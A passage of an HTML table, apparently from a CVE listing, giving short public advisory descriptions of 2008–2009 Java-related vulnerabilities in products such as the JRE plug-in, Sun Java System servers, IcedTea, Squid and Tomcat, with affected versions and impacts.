		<td valign="top">The Java Web Start framework in IcedTea in OpenJDK before 1.6.0.0-20.b16.fc10 on Fedora 10, and before 1.6.0.0-27.b16.fc11 on Fedora 11, trusts an entire application when at least one of the listed jar files is trusted, which allows context-dependent attackers to execute arbitrary code without the untrusted-code restrictions via a crafted application, related to NetX.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1837">CVE-2009-1837</a></td>
		<td valign="top">Race condition in the NPObjWrapper_NewResolve function in modules/plugin/base/src/nsJSNPRuntime.cpp in xul.dll in Mozilla Firefox 3 before 3.0.11 might allow remote attackers to execute arbitrary code via a page transition during Java applet loading, related to a use-after-free vulnerability for memory associated with a destroyed Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1796">CVE-2009-1796</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Sun Java System Portal Server 6.3.1, 7.1, and 7.2 allows remote attackers to inject arbitrary web script or HTML via vectors related to an error page.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1754">CVE-2009-1754</a></td>
		<td valign="top">The PackageManagerService class in services/java/com/android/server/PackageManagerService.java in Android 1.5 through 1.5 CRB42 does not properly check developer certificates during processing of sharedUserId requests at an application's installation time, which allows remote user-assisted attackers to access application data by creating a package that specifies a shared user ID with an arbitrary application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1729">CVE-2009-1729</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Communications Express 6 2005Q4 (aka 6.2) and 6.3 allow remote attackers to inject arbitrary web script or HTML via (1) the abperson_displayName parameter to uwc/abs/search.xml in the Add Contact implementation in the Personal Address Book component or (2) the temporaryCalendars parameter to uwc/base/UWCMain.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1719">CVE-2009-1719</a></td>
		<td valign="top">The Aqua Look and Feel for Java implementation in Java 1.5 on Mac OS X 10.5 allows remote attackers to execute arbitrary code via a call to the undocumented apple.laf.CColourUIResource constructor with a crafted value in the first argument, which is dereferenced as a pointer.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1712">CVE-2009-1712</a></td>
		<td valign="top">WebKit in Apple Safari before 4.0 does not prevent remote loading of local Java applets, which allows remote attackers to execute arbitrary code, gain privileges, or obtain sensitive information via an APPLET or OBJECT element.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1672">CVE-2009-1672</a></td>
		<td valign="top">The Deployment Toolkit ActiveX control in deploytk.dll 6.0.130.3 in Sun Java SE Runtime Environment (aka JRE) 6 Update 13 allows remote attackers to (1) execute arbitrary code via a .jnlp URL in the argument to the launch method, and might allow remote attackers to launch JRE installation processes via the (2) installLatestJRE or (3) installJRE method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1671">CVE-2009-1671</a></td>
		<td valign="top">Multiple buffer overflows in the Deployment Toolkit ActiveX control in deploytk.dll 6.0.130.3 in Sun Java SE Runtime Environment (aka JRE) 6 Update 13 allow remote attackers to execute arbitrary code via a long string argument to the (1) setInstallerType, (2) setAdditionalPackages, (3) compareVersion, (4) getStaticCLSID, or (5) launch method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1553">CVE-2009-1553</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the Admin Console in Sun GlassFish Enterprise Server 2.1 allow remote attackers to inject arbitrary web script or HTML via the query string to (1) applications/applications.jsf, (2) configuration/configuration.jsf, (3) customMBeans/customMBeans.jsf, (4) resourceNode/resources.jsf, (5) sysnet/registration.jsf, or (6) webService/webServicesGeneral.jsf; or the name parameter to (7) configuration/auditModuleEdit.jsf, (8) configuration/httpListenerEdit.jsf, or (9) resourceNode/jdbcResourceEdit.jsf.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1521">CVE-2009-1521</a></td>
		<td valign="top">Unspecified vulnerability in the Java GUI in the IBM Tivoli Storage Manager (TSM) client 5.2.0.0 through 5.2.5.3, 5.3.0.0 through 5.3.6.5, 5.4.0.0 through 5.4.2.6, and 5.5.0.0 through 5.5.1.17, and the TSM Express client 5.3.3.0 through 5.3.6.5, allows attackers to read or modify arbitrary files via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1473">CVE-2009-1473</a></td>
		<td valign="top">The (1) Windows and (2) Java client programs for the ATEN KH1516i IP KVM switch with firmware 1.0.063 and the KN9116 IP KVM switch with firmware 1.1.104 do not properly use RSA cryptography for a symmetric session-key negotiation, which makes it easier for remote attackers to (a) decrypt network traffic, or (b) conduct man-in-the-middle attacks, by repeating unspecified "client-side calculations."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1472">CVE-2009-1472</a></td>
		<td valign="top">The Java client program for the ATEN KH1516i IP KVM switch with firmware 1.0.063 and the KN9116 IP KVM switch with firmware 1.1.104 has a hardcoded AES encryption key, which makes it easier for man-in-the-middle attackers to (1) execute arbitrary Java code, or (2) gain access to machines connected to the switch, by hijacking a session.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1357">CVE-2009-1357</a></td>
		<td valign="top">CRLF injection vulnerability in da/DA/Login in Sun Java System Delegated Administrator 6.2 through 6.4 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via the HELP_PAGE parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1332">CVE-2009-1332</a></td>
		<td valign="top">The Online Help feature in Sun Java System Directory Server 5.2 and Enterprise Edition 5 allows remote attackers to determine the existence of files and directories, and possibly obtain partial contents of files, via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1219">CVE-2009-1219</a></td>
		<td valign="top">Sun Calendar Express Web Server in Sun ONE Calendar Server 6.0 and Sun Java System Calendar Server 6 2004Q2 through 6.3-7.01 allows remote attackers to cause a denial of service (daemon crash) via multiple requests to the default URI with alphabetic characters in the tzid parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1218">CVE-2009-1218</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Calendar Express Web Server in Sun ONE Calendar Server 6.0 and Sun Java System Calendar Server 6 2004Q2 through 6.3-7.01 allow remote attackers to inject arbitrary web script or HTML via (1) the fmt-out parameter to login.wcap or (2) the date parameter to command.shtml.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1211">CVE-2009-1211</a></td>
		<td valign="top">Blue Coat ProxySG, when transparent interception mode is enabled, uses the HTTP Host header to determine the remote endpoint, which allows remote attackers to bypass access controls for Flash, Java, Silverlight, and probably other technologies, and possibly communicate with restricted intranet sites, via a crafted web page that causes a client to send HTTP requests with a modified Host header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1190">CVE-2009-1190</a></td>
		<td valign="top">Algorithmic complexity vulnerability in the java.util.regex.Pattern.compile method in Sun Java Development Kit (JDK) before 1.6, when used with spring.jar in SpringSource Spring Framework 1.1.0 through 2.5.6 and 3.0.0.M1 through 3.0.0.M2 and dm Server 1.0.0 through 1.0.2, allows remote attackers to cause a denial of service (CPU consumption) via serializable data with a long regex string containing multiple optional groups, a related issue to CVE-2004-2540.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1107">CVE-2009-1107</a></td>
		<td valign="top">The Java Plug-in in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 6 Update 12 and earlier, and 5.0 Update 17 and earlier, allows remote attackers to trick a user into trusting a signed applet via unknown vectors that misrepresent the security warning dialog, related to a "Swing JLabel HTML parsing vulnerability," aka CR 6782871.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1106">CVE-2009-1106</a></td>
		<td valign="top">The Java Plug-in in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 6 Update 12, 11, and 10 does not properly parse crossdomain.xml files, which allows remote attackers to bypass intended access restrictions and connect to arbitrary sites via unknown vectors, aka CR 6798948.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1105">CVE-2009-1105</a></td>
		<td valign="top">The Java Plug-in in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 6 Update 12, 11, and 10 allows user-assisted remote attackers to cause a trusted applet to run in an older JRE version, which can be used to exploit vulnerabilities in that older version, aka CR 6706490.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1104">CVE-2009-1104</a></td>
		<td valign="top">The Java Plug-in in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier; 6 Update 12 and earlier; and 1.4.2_19 and earlier does not prevent Javascript that is loaded from the localhost from connecting to other ports on the system, which allows user-assisted attackers to bypass intended access restrictions via LiveConnect, aka CR 6724331.  NOTE: this vulnerability can be leveraged with separate cross-site scripting (XSS) vulnerabilities for remote attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1103">CVE-2009-1103</a></td>
		<td valign="top">Unspecified vulnerability in the Java Plug-in in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier; 6 Update 12 and earlier; 1.4.2_19 and earlier; and 1.3.1_24 and earlier allows remote attackers to access files and execute arbitrary code via unknown vectors related to "deserializing applets," aka CR 6646860.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1102">CVE-2009-1102</a></td>
		<td valign="top">Unspecified vulnerability in the Virtual Machine in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 6 Update 12 and earlier allows remote attackers to access files and execute arbitrary code via unknown vectors related to "code generation."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1101">CVE-2009-1101</a></td>
		<td valign="top">Unspecified vulnerability in the lightweight HTTP server implementation in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 6 Update 12 and earlier allows remote attackers to cause a denial of service (probably resource consumption) for a JAX-WS service endpoint via a connection without any data, which triggers a file descriptor "leak."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1100">CVE-2009-1100</a></td>
		<td valign="top">Multiple unspecified vulnerabilities in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier, and 6 Update 12 and earlier, allow remote attackers to cause a denial of service (disk consumption) via vectors related to temporary font files and (1) "limits on Font creation," aka CR 6522586, and (2) another unspecified vector, aka CR 6632886.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1099">CVE-2009-1099</a></td>
		<td valign="top">Integer signedness error in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier, and 6 Update 12 and earlier, allows remote attackers to access files or execute arbitrary code via crafted glyph descriptions in a Type1 font, which bypasses a signed comparison and triggers a buffer overflow.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1098">CVE-2009-1098</a></td>
		<td valign="top">Buffer overflow in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier; 6 Update 12 and earlier; 1.4.2_19 and earlier; and 1.3.1_24 and earlier allows remote attackers to access files or execute arbitrary code via a crafted GIF image, aka CR 6804998.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1097">CVE-2009-1097</a></td>
		<td valign="top">Multiple buffer overflows in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 6 Update 12 and earlier allow remote attackers to access files or execute arbitrary code via (1) a crafted PNG image that triggers an integer overflow during memory allocation for display on the splash screen, aka CR 6804996; and (2) a crafted GIF image from which unspecified values are used in calculation of offsets, leading to object-pointer corruption, aka CR 6804997.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1096">CVE-2009-1096</a></td>
		<td valign="top">Buffer overflow in unpack200 in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier, and 6 Update 12 and earlier, allows remote attackers to access files or execute arbitrary code via a JAR file with crafted Pack200 headers.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1095">CVE-2009-1095</a></td>
		<td valign="top">Integer overflow in unpack200 in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier, and 6 Update 12 and earlier, allows remote attackers to access files or execute arbitrary code via a JAR file with crafted Pack200 headers.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1094">CVE-2009-1094</a></td>
		<td valign="top">Unspecified vulnerability in the LDAP implementation in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier; 6 Update 12 and earlier; SDK and JRE 1.3.1_24 and earlier; and 1.4.2_19 and earlier allows remote LDAP servers to execute arbitrary code via unknown vectors related to serialized data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1093">CVE-2009-1093</a></td>
		<td valign="top">LdapCtx in the LDAP service in Java SE Development Kit (JDK) and Java Runtime Environment (JRE) 5.0 Update 17 and earlier; 6 Update 12 and earlier; SDK and JRE 1.3.1_24 and earlier; and 1.4.2_19 and earlier does not close the connection when initialization fails, which allows remote attackers to cause a denial of service (LDAP service hang).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1088">CVE-2009-1088</a></td>
		<td valign="top">Hannon Hill Cascade Server 5.7 and other versions allows remote authenticated users to execute arbitrary programs or Java code via a crafted XSLT stylesheet with "extension elements and extension functions" that trigger code execution by Xalan-Java, as demonstrated using xalan://java.lang.Runtime.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1084">CVE-2009-1084</a></td>
		<td valign="top">Sun Java System Identity Manager (IdM) 7.0 through 8.0 does not properly restrict access to the System Configuration object, which allows remote authenticated administrators and possibly remote attackers to have an unspecified impact by modifying this object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1083">CVE-2009-1083</a></td>
		<td valign="top">Sun Java System Identity Manager (IdM) 7.0 through 8.0 on Linux, AIX, Solaris, and HP-UX permits "control characters" in the passwords of user accounts, which allows remote attackers to execute arbitrary commands via vectors involving "resource adapters."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1082">CVE-2009-1082</a></td>
		<td valign="top">Sun Java System Identity Manager (IdM) 7.0 through 8.0 allows remote authenticated users to gain privileges by submitting crafted commands to the Admin Console, as demonstrated by privileges for account creation and other administrative capabilities, related to the saveNoValidate action and saveNoValidateAllowedFormsAndWorkflows IDs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1081">CVE-2009-1081</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Identity Manager (IdM) 7.0 through 8.0 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors, aka Bug IDs 19595 and 19661.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1080">CVE-2009-1080</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Identity Manager (IdM) 7.0 through 8.0 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors, aka Bug ID 19033.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1079">CVE-2009-1079</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Identity Manager (IdM) 7.0 through 8.0 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors, aka Bug IDs 19659, 19660, and 19683.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1078">CVE-2009-1078</a></td>
		<td valign="top">Sun Java System Identity Manager (IdM) 7.0 through 8.0 does not enforce the expected privilege requirements for (1) deleting audit policies and (2) modifying workflows, which allows remote authenticated users to have an unspecified impact.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1077">CVE-2009-1077</a></td>
		<td valign="top">The Change My Password implementation in the admin interface in Sun Java System Identity Manager (IdM) 7.0 through 8.0 does not enforce the RequiresChallenge property setting, which allows remote authenticated users to change the passwords of other users, as demonstrated by changing the administrator's password.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1076">CVE-2009-1076</a></td>
		<td valign="top">Sun Java System Identity Manager (IdM) 7.0 through 8.0 responds differently to failed use of the end-user question-based login feature depending on whether the user account exists, which allows remote attackers to enumerate valid usernames.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1075">CVE-2009-1075</a></td>
		<td valign="top">Sun Java System Identity Manager (IdM) 7.0 through 8.0 responds differently to failed use of the Forgot Password feature depending on whether the user account exists, which allows remote attackers to enumerate valid usernames.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-1074">CVE-2009-1074</a></td>
		<td valign="top">Sun Java System Identity Manager (IdM) 7.0 through 8.0 does not use SSL in all expected circumstances, which makes it easier for remote attackers to obtain sensitive information by sniffing the network, related to "ssl termination devices" and lack of support for relative URLs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0877">CVE-2009-0877</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in Sun Java System Communications Express allow remote attackers to inject arbitrary web script or HTML via the (1) Full Name or (2) Subject field.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0804">CVE-2009-0804</a></td>
		<td valign="top">Ziproxy 2.6.0, when transparent interception mode is enabled, uses the HTTP Host header to determine the remote endpoint, which allows remote attackers to bypass access controls for Flash, Java, Silverlight, and probably other technologies, and possibly communicate with restricted intranet sites, via a crafted web page that causes a client to send HTTP requests with a modified Host header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0803">CVE-2009-0803</a></td>
		<td valign="top">SmoothWall SmoothGuardian, as used in SmoothWall Firewall, NetworkGuardian, and SchoolGuardian 2008, when transparent interception mode is enabled, uses the HTTP Host header to determine the remote endpoint, which allows remote attackers to bypass access controls for Flash, Java, Silverlight, and probably other technologies, and possibly communicate with restricted intranet sites, via a crafted web page that causes a client to send HTTP requests with a modified Host header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0802">CVE-2009-0802</a></td>
		<td valign="top">Qbik WinGate, when transparent interception mode is enabled, uses the HTTP Host header to determine the remote endpoint, which allows remote attackers to bypass access controls for Flash, Java, Silverlight, and probably other technologies, and possibly communicate with restricted intranet sites, via a crafted web page that causes a client to send HTTP requests with a modified Host header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0801">CVE-2009-0801</a></td>
		<td valign="top">Squid, when transparent interception mode is enabled, uses the HTTP Host header to determine the remote endpoint, which allows remote attackers to bypass access controls for Flash, Java, Silverlight, and probably other technologies, and possibly communicate with restricted intranet sites, via a crafted web page that causes a client to send HTTP requests with a modified Host header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0794">CVE-2009-0794</a></td>
		<td valign="top">Integer overflow in the PulseAudioTargetDataL class in src/java/org/classpath/icedtea/pulseaudio/PulseAudioTargetDataLine.java in Pulse-Java, as used in OpenJDK 1.6.0.0 and other products, allows remote attackers to cause a denial of service (applet crash) via a crafted Pulse Audio source data line.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0618">CVE-2009-0618</a></td>
		<td valign="top">Unspecified vulnerability in the Java agent in Cisco Application Networking Manager (ANM) before 2.0 Update A allows remote attackers to gain privileges, and cause a denial of service (service outage) by stopping processes, or obtain sensitive information by reading configuration files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0609">CVE-2009-0609</a></td>
		<td valign="top">Sun Java System Directory Proxy Server in Sun Java System Directory Server Enterprise Edition 6.0 through 6.3, when a JDBC data source is used, does not properly handle (1) a long value in an ADD or (2) long string attributes, which allows remote attackers to cause a denial of service (JDBC backend outage) via crafted LDAP requests.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0576">CVE-2009-0576</a></td>
		<td valign="top">Unspecified vulnerability in Sun Java System Directory Server 5.2 p6 and earlier, and Enterprise Edition 5, allows remote attackers to cause a denial of service (daemon crash) via crafted LDAP requests.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0435">CVE-2009-0435</a></td>
		<td valign="top">Unspecified vulnerability in the IBM Asynchronous I/O (aka AIO or libibmaio) library in the Java Message Service (JMS) component in IBM WebSphere Application Server (WAS) 6.1.x before 6.1.0.17 on AIX 5.3 allows attackers to cause a denial of service (daemon crash) via vectors related to the aio_getioev2 and getEvent methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0348">CVE-2009-0348</a></td>
		<td valign="top">The login module in Sun Java System Access Manager 6 2005Q1 (aka 6.3), 7 2005Q4 (aka 7.0), and 7.1 responds differently to a failed login attempt depending on whether the user account exists, which allows remote attackers to enumerate valid usernames.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0278">CVE-2009-0278</a></td>
		<td valign="top">Sun Java System Application Server (AS) 8.1 and 8.2 allows remote attackers to read the Web Application configuration files in the (1) WEB-INF or (2) META-INF directory via a malformed request.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0170">CVE-2009-0170</a></td>
		<td valign="top">Sun Java System Access Manager 6.3 2005Q1, 7 2005Q4, and 7.1 allows remote authenticated users with console privileges to discover passwords, and obtain unspecified other "access to resources," by visiting the Configuration Items component in the console.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0169">CVE-2009-0169</a></td>
		<td valign="top">Sun Java System Access Manager 7.1 allows remote authenticated sub-realm administrators to gain privileges, as demonstrated by creating the amadmin account in the sub-realm, and then logging in as amadmin in the root realm.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2009-0033">CVE-2009-0033</a></td>
		<td valign="top">Apache Tomcat 4.1.0 through 4.1.39, 5.5.0 through 5.5.27, and 6.0.0 through 6.0.18, when the Java AJP connector and mod_jk load balancing are used, allows remote attackers to cause a denial of service (application outage) via a crafted request with invalid headers, related to temporary blocking of connectors that have encountered errors, as demonstrated by an error involving a malformed HTTP Host header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-6830">CVE-2008-6830</a></td>
		<td valign="top">The disconnection feature in Citrix Web Interface 5.0 and 5.0.1 for Java Application Servers does not properly terminate a user's web interface session, which allows attackers with access to the same browser instance to gain access to the user's Web Interface session. NOTE: the attacker must also have valid credentials to the Web Interface.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-6366">CVE-2008-6366</a></td>
		<td valign="top">SQL injection vulnerability in logon.jsp in Ad Server Solutions Affiliate Software Java 4.0 allows remote attackers to execute arbitrary SQL commands via the (1) username and (2) password, possibly related to the uname and pass parameters to logon_process.jsp.  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-6365">CVE-2008-6365</a></td>
		<td valign="top">SQL injection vulnerability in logon.jsp in Ad Server Solutions Ad Management Software Java allows remote attackers to execute arbitrary SQL commands via the (1) username and (2) password, related to the uname or pass parameters to logon.jsp or logon_processing.jsp.  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-6364">CVE-2008-6364</a></td>
		<td valign="top">SQL injection vulnerability in logon_process.jsp in Ad Server Solutions Banner Exchange Solution Java allows remote attackers to execute arbitrary SQL commands via the (1) username (uname parameter) and (2) password (pass parameter).  NOTE: some of these details are obtained from third party information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-6192">CVE-2008-6192</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in unspecified Portlets in Sun Java System Portal Server 7.0 and 7.1 allow remote attackers to inject arbitrary web script or HTML via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5662">CVE-2008-5662</a></td>
		<td valign="top">Multiple buffer overflows in Sun Java Wireless Toolkit (WTK) for CLDC 2.5.2 and earlier allow downloaded programs to execute arbitrary code via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5550">CVE-2008-5550</a></td>
		<td valign="top">Open redirect vulnerability in console/faces/jsp/login/BeginLogin.jsp in Sun Java Web Console 3.0.2 through 3.0.5 and Solaris 10 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via the redirect_url parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5549">CVE-2008-5549</a></td>
		<td valign="top">Unspecified vulnerability in the Sun Java Web Console components in Sun Java System Portal Server 7.1 and 7.2 allows remote attackers to access local files and read the product's configuration information via unknown vectors related to "access to secure files by ThemeServlet."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5495">CVE-2008-5495</a></td>
		<td valign="top">Unspecified vulnerability in the GungHo LoadPrgAx ActiveX control 1.0.0.6 and earlier allows remote attackers to execute arbitrary Java applications via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5360">CVE-2008-5360</a></td>
		<td valign="top">Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; SDK and JRE 1.4.2_18 and earlier; and SDK and JRE 1.3.1_23 and earlier creates temporary files with predictable file names, which allows attackers to write malicious JAR files via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5359">CVE-2008-5359</a></td>
		<td valign="top">Buffer overflow in Java Runtime Environment (JRE) for Sun JDK and JRE 6 Update 10 and earlier; JDK and JRE 5.0 Update 16 and earlier; SDK and JRE 1.4.2_18 and earlier; and SDK and JRE 1.3.1_23 and earlier might allow remote attackers to execute arbitrary code, related to a ConvolveOp operation in the Java AWT library.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2008-5358">CVE-2008-5358</a></td>
